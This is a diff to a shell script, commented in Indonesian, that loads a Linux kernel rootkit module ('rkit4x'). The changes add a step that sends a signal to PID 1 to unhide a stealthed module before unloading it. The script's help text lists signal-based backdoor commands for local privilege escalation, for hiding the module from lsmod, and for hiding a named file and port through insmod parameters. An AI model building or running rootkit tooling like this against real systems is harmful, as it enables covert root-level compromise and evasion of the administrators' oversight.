@@ -101,11 +101,31 @@ else
 	echo "[i] modinfo tidak ada — vermagic dilewati"
 fi
 
-# ----------------6. load ----------------
+# ----------------6. unload lama (hindari "File exists") ----------------
+# kill -s62 dulu: bila modul tersembunyi (tak terlihat di /proc/modules),
+# sinyal menampilkannya kembali agar rmmod bisa menemukannya.
+kill -s62 1 2>/dev/null || true
+for m in rkit4x rkit rkit6x; do
+	if grep -q "^$m " /proc/modules 2>/dev/null; then
+		if rmmod "$m" 2>/tmp/rkit-rmmod.log; then
+			echo "[i] modul lama '$m' diunload"
+		else
+			echo "[!] modul '$m' termuat tapi gagal rmmod:"
+			cat /tmp/rkit-rmmod.log
+			exit 1
+		fi
+	fi
+done
+
+# ----------------7. load ----------------
 echo "[*] insmod..."
 if ! insmod "$ROOT/$KO" 2>/tmp/rkit-insmod.log; then
 	echo "[!] insmod gagal:"
 	cat /tmp/rkit-insmod.log
+	if grep -q "File exists" /tmp/rkit-insmod.log; then
+		echo "    modul lama masih termuat dan tidak terlihat di /proc/modules"
+		echo "    (kemungkinan tersembunyi oleh versi lama) -> REBOOT lalu jalankan lagi"
+	fi
 	echo "    (kalau OOPS/panic — lihat docs/TESTING.md tahap load)"
 	exit 1
 fi
@@ -180,7 +200,7 @@ if [ "$BACKEND_KIND" = "legacy" ]; then
 	echo "Perintah cepat (legacy — kontrol via SINYAL + param insmod):"
 	echo "  kill -s63 1                                  # LPE (uji dari user biasa)"
 	echo "  kill -s64 1                                  # hide modul -> lsmod kosong"
-	echo "  kill -s65 1                                  # tampilkan modul (sebelum rmmod)"
+	echo "  kill -s62 1                                  # tampilkan modul (sebelum rmmod)"
 	echo "  rmmod rkit4x && insmod $KO hide=\"rahasia.txt\" hideport=\"8080\""
 	echo "                                               # ^ reload untuk menerapkan daftar hide"
 	echo "  rmmod rkit4x                                 # unload bersih (tabel dipulihkan)"
